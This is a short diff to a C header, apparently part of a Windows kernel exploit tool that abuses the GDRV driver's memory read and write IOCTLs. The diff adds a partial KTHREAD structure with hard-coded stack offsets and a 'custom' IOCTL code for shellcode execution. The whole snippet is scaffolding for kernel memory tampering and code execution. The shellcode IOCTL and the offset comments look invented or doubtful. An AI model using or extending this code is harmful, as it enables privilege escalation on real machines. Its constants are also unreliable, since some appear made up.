@@ -13,6 +13,13 @@ typedef enum _POOL_TYPE {
     NonPagedPoolCacheAligned,
 } POOL_TYPE;
 
+typedef struct _KTHREAD {
+    // Only defining the fields we need
+    UINT8 Padding1[0x28];  // Padding to stack base offset 
+    UINT64 StackBase;      // Offset 0x28 - Stack base pointer
+    UINT64 StackLimit;     // Next field after stack base
+} KTHREAD, *PKTHREAD;
+
 typedef struct _DRIVER_OBJECT {
     USHORT Type;
     USHORT Size;
@@ -33,8 +40,9 @@ typedef struct _DRIVER_OBJECT {
 
 // GDRV driver definitions
 #define GDRV_DEVICE L"\\\\.\\GIO"
-#define GDRV_IOCTL_READ_MEMORY  0x80102040
-#define GDRV_IOCTL_WRITE_MEMORY 0x80102044
+#define GDRV_IOCTL_READ_MEMORY       0x80102040
+#define GDRV_IOCTL_WRITE_MEMORY      0x80102044
+#define GDRV_IOCTL_EXECUTE_SHELLCODE 0x80102050  // Custom IOCTL for shellcode execution
 
 // Memory access structures
 typedef struct _GDRV_MEMORY_READ {
